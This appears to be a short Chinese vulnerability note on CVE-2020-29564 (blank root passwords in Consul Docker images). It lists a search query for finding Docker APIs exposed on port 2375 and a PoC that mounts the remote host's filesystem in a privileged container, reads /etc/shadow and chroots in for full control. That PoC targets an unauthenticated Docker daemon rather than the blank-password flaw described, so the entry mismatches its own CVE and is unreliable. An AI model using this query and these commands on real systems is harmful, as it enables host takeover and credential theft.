Consul Docker images 空密码登录漏洞 CVE-2020-29564

## 漏洞描述

Hashicorp Consul Docker images 0.7.1至1.4.2版本部署的Consul Docker容器的系统，可能允许远程攻击者使用空白密码来实现root用户访问。

参考链接：

- https://github.com/koharin/CVE/blob/main/CVE-2020-29564

## 漏洞影响

```
Consul Docker images 0.7.1-1.4.2
```

## 网络测绘

```
port="2375" && protocol=="docker"
```

## 漏洞复现

poc：

```
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine

File Access: cat /mnt/etc/shadow
RCE: chroot /mnt
```

